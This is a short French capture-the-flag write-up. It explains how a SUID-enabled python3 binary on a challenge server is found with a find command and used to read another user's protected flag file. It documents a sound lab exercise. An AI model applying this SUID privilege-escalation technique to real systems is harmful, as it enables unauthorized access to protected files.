# To B, or ! to B - 128 points

## Problème

```idl
Votre client vous remercie pour votre travail et vous assure qu'il a fait les modifications nécessaires pour améliorer la sécurité de son serveur applicatif.
Prouvez-lui que ce n'est toujours pas suffisant.


=== Connexion SSH ===
Login : padawan
Mdp : padawan
Serveur : toBOrNot2B.phack.fr
```

## Résolution

En arrivant sur le serveur, voici ce qui nous est envoyé:

```
Bienvenue !

Le flag se trouve dans /home/master/flag.txt
Malheureusement, tu n'as pas les droits de le lire.

Trouves un moyen d'y accéder par toi même.

Bonne chance...



-bash-5.1$
```

Le challenge porte le tag `suid`. Il s'agit probablement d'une escalation de privilèges vers `master` ou plus.

On cherche les fichiers avec le bit SUID : `find / -perm /4000 2> /dev/null`. Le seul résultat est `python3`, qui nous permet d'exécuter du Python en tant que `master`.

Reste à l'utiliser pour lire le flag :

```
-bash-5.1$ cd ../master/
-bash-5.1$ python3 -c "with open('./flag.txt','r') as f: print(f.read())"
PHACK{U_4r3_hiM_bu7_h3's_n07_U}
```

**Flag: `PHACK{U_4r3_hiM_bu7_h3's_n07_U}`**